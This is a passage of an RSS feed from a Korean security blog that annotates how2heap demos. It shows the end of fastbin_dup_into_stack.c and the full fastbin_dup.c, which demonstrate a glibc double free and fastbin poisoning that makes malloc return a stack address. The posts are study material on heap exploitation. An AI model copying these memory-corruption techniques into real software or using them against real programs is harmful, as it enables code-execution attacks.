(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png"><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58422108-b4696300-80cc-11e9-9c6f-31db09f069bb.png"></p><center><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">Source</a></strong></p></center><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup</title>
      <link>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/</guid>
      <pubDate>Mon, 27 May 2019 10:31:21 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dupc&quot;&gt;&lt;a class=&quot;markdownI
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dupc"><a class="markdownIt-Anchor" href="#fastbin_dupc"></a> fastbin_dup.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a); <span class="comment">// a를 한번 더 free하면 에러가 발생한다.(free list의 top에 위치하고 있기 때문)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a); <span class="comment">// 이제 free list의 최상단에서 벗어났으니 free(a)가 가능하다.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span>, a, b, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 세 번 하면, malloc a(8)를 두번 할당할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58414702-2931a280-80b7-11e9-9653-34ff0e49c802.png"></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
